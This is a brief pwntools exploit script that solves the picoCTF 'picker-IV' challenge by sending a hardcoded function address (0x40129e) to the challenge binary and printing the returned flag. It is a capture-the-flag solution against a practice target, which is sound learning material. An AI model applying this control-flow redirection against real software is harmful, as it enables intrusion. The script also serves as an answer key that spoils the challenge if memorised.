#!/usr/bin/env python3

from pwn import *

exe = ELF("./picker-IV")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 64298)

    return r


def main():
    r = conn()

    address = '40129e'      # Address of function to pass as a string to the program, in input (see source code)
    r.sendlineafter('\'0x\': ', address)
    flag = r.recvlinesS(3)[2]
    print("Flag: " + flag)


if __name__ == "__main__":
    main()
